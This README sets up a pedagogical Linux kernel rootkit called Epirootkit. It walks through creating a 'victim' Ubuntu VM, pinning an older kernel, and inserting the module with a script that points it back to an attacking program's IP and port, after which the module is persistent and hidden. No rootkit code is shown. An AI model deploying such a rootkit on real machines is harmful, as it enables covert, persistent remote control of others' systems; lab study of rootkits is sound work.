# Epirootkit

some sneaky rootkit with a cool program to manage it remotely

## Setup

### Victim machine

#### Creating the VM

Let's begin by downloading the Ubuntu ISO from their official archive. You can
download it with wget using the following command:

```bash
wget https://old-releases.ubuntu.com/releases/focal/ubuntu-20.04-desktop-amd64.iso
```

Then, you will need to install the Virt-Manager program, in order to easily
manage KVM guests. It is packaged on all popular distributions, and the
download instructions can be found
[here](https://virt-manager.org/download.html).


Your computer will also need to have virtualization setup, ideally with KVM.
The steps are very specific to the hardware and distributions you use.

Once ready, you can open Virt-Manager and click on the `+` button to create a
new virtual machine. Select the previously downloaded image and follow the
install wizard to complete the setup as you like. You can name the machine
anything you like, and give it as much hardware resources as you want, just
make sure it's enough to handle this very advanced rootkit.

#### Installing Ubuntu

Start the VM and click the `Install Ubuntu` button. Choose a language and keyboard layout,
and make sure to untick the `Download updates while installing ubuntu` option on step 4. 
A minimal install is enough and will save you space and time.

![Ubuntu install step 4](./img/installvictim_1.png) 

Follow the rest of the wizard. This guide will assume you machine's hostname is
`victim` and the user is named `user`, but you can use whatever.

#### Installing packages, kernel and rootkit

Once the install is finished, reboot the machine, and get this repository.
There are various ways do to so:
- Set up a mountpoint between your host machine and the VM
- Generate an SSH key on the VM, and add it to your Forge profile so you can clone it
- Share your local folder with `scp`

I will demonstrate the last option here as it is very straightforward. First, click the
blue "info" button on the top bar of your Virt-Manager window, navigate to the "NIC"
tab, and take note of the "IP address" field.

![vm's ip address](./img/2025-06-14-191539_hyprshot.png) 

Open a terminal in the VM and install SSH with the following command:

```bash
sudo apt install ssh
```

Make sure it's running with:

```bash
sudo systemctl status ssh
```

Then, use the following command to copy your local repository to the VM, making
sure to replace the local path, victim user name and IP by their actual values
(here i use `./epirootkit`, `user` and `192.168.122.29`)

```bash
scp -r ./epirootkit user@192.168.122.29:/home/user/epirootkit
```

Navigate to the `rootkit` directory and run the `bootstrap.sh` to handle all
the next important steps for you:
- update package repositories
- upgrade installed packages
- install the needed development packages to compile the kernel module
- edit the Grub configuration to allow you to boot in the right kernel

The last point is important because the rootkit is made to work with a kernel
version inferior to `5.7`. The Ubuntu 24.04 LTS release initially shipped with
version `5.4.0-26`, but donwloading it today will automatically bundle a more
recent version (`5.15.0-139`). The `5.4.0-26` version is still present in the
ISO, you can verify it by running `ls /lib/modules`, so we don't have to
install anything. The script will simply set the default boot entry to the
right kernel.

After you run the script, make sure you reboot the VM in order to switch to
the correct kernel version. You can verify it with the command `uname -r`.

Next, let's build the kernel module by navigating to the `rootkit` directory. 
Running `make` will produce the `epirootkit.ko` module, but you should use 
the provided `insert.sh` script to handle this. The script will create some
directories used by the rootkit to store various data, build the module,
and finally insert it with `insmod`. Two arguments can optionally be given to 
it: the IP address of the attacking program, and the port. You'll most likely
only want to provide an IP, as the default port is set to be the same on the 
rootkit and the attacking program (6667).

```bash
# IP will be 127.0.0.1, port 6667:
./insert.sh

# Set only IP (port will be 6667):
./insert.sh '192.168.1.88'

# Set IP and port:
./insert.sh '192.168.1.88' '9999'
```

> [!WARNING]
> Inserting the module will make it persistent and hidden by default! To remove
> it, you'll need to connect it to the attacking program, unlock it with the 
> password, un-hide it, and then use rmmod.

Now that you've managed to insert the rootkit, you can check it's activity in
the kernel logs with `dmesg -L -T -w`.

> [!NOTE]
> Flooding the kernel logs isn't very smart for a rootkit that wants to 
> acutally go unnoticed, but being a pedagocical project, I choose to keep the
> logs enabled by default, so you can see what's going on under the hood.
